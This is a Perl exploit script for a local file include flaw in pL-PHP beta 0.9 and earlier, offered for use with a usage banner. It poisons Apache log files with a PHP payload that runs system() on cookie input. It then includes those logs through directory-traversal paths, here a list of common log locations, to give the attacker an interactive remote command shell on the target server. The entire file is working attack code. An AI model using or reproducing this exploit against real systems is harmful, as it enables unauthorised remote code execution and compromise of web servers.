#!/usr/bin/perl
#pL-PHP <= beta 0.9 Local File Include Exploit
#Discovered by cr4wl3r
#Contact : cr4wl3r[!]linuxmail.org
use IO::Socket;
use LWP::Simple;
@apache=(
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../../../../etc/httpd/logs/acces_log",
"../../../../../../../etc/httpd/logs/acces.log",
"../../../../../../../etc/httpd/logs/error_log",
"../../../../../../../etc/httpd/logs/error.log",
"../../../../../../../var/www/logs/access_log",
"../../../../../../../var/www/logs/access.log",
"../../../../../../../usr/local/apache/logs/access_log",
"../../../../../../../usr/local/apache/logs/access.log",
"../../../../../../../var/log/apache/access_log",
"../../../../../../../var/log/apache2/access_log",
"../../../../../../../var/log/apache/access.log",
"../../../../../../../var/log/apache2/access.log",
"../../../../../../../var/log/access_log",
"../../../../../../../var/log/access.log",
"../../../../../../../var/www/logs/error_log",
"../../../../../../../var/www/logs/error.log",
"../../../../../../../usr/local/apache/logs/error_log",
"../../../../../../../usr/local/apache/logs/error.log",
"../../../../../../../var/log/apache/error_log",
"../../../../../../../var/log/apache2/error_log",
"../../../../../../../var/log/apache/error.log",
"../../../../../../../var/log/apache2/error.log",
"../../../../../../../var/log/error_log",
"../../../../../../../var/log/error.log"

);
if (@ARGV < 3){
print "
========================================================================
|                 pL-PHP <= beta 0.9 Local File Include Exploit
|               Usage: gorontalo.pl [target] [path] [apachepath]
|           Example: gorontalo.pl target.com /pages/ ../logs/error.log
|                            coded by : cr4wl3r
========================================================================
";
exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print "Injecting code in log files...\n";
$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connect Failed.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "User-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);
print "Write END to exit!\n";
print "IF not working try another apache path\n\n";

print "[shell] ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connect Failed.\n\n";
    print $socket "GET ".$path."/modules/pages/index.php?id=".$apache[$apachepath]."&cmd=$cmd HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "[shell] ";
    $cmd = <STDIN>;
}
